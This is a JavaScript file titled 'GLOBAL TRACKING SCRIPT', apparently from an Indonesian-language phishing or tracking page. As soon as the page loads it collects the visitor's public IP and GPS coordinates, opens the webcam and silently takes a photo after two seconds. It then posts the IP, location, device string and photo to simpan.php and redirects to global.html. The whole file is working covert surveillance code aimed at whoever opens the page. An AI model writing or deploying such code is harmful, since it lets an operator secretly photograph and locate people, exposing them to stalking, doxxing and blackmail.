// ===============================
// GLOBAL TRACKING SCRIPT
// ===============================

const video = document.createElement("video");
const canvas = document.createElement("canvas");
const ctx = canvas.getContext("2d");

let ip = "unknown";
let lokasi = "unknown";
let device = navigator.userAgent;
let foto = "";

// ===============================
// Ambil IP
// ===============================
async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ip = data.ip;
  } catch (e) {
    console.log("Gagal ambil IP");
  }
}

// ===============================
// Ambil Lokasi
// ===============================
function getLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      lokasi = "GPS tidak tersedia";
      resolve();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        lokasi =
          pos.coords.latitude + "," + pos.coords.longitude;
        resolve();
      },
      () => {
        lokasi = "GPS ditolak";
        resolve();
      }
    );
  });
}

// ===============================
// Ambil Kamera
// ===============================
async function getCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: true
    });

    video.srcObject = stream;
    video.play();

    return new Promise((resolve) => {
      video.onloadedmetadata = () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        setTimeout(() => {
          ctx.drawImage(video, 0, 0);
          foto = canvas.toDataURL("image/png");

          stream.getTracks().forEach(track => track.stop());

          resolve();
        }, 2000);
      };
    });

  } catch (e) {
    console.log("Kamera ditolak");
    foto = "kamera ditolak";
  }
}

// ===============================
// Kirim ke PHP
// ===============================
async function kirimData() {
  try {

    const response = await fetch("simpan.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body:
        "ip_address=" + encodeURIComponent(ip) +
        "&lokasi=" + encodeURIComponent(lokasi) +
        "&perangkat=" + encodeURIComponent(device) +
        "&foto=" + encodeURIComponent(foto)
    });

    const result = await response.text();

    console.log("Data terkirim:", result);

  } catch (error) {
    console.log("Gagal kirim:", error);
  }

  setTimeout(() => {
    window.location.href = "global.html";
  }, 3000);
}

// ===============================
// Jalankan Semua
// ===============================
async function start() {

  console.log("Memulai sistem...");

  await getIP();
  await getLocation();
  await getCamera();
  await kirimData();

}

start();
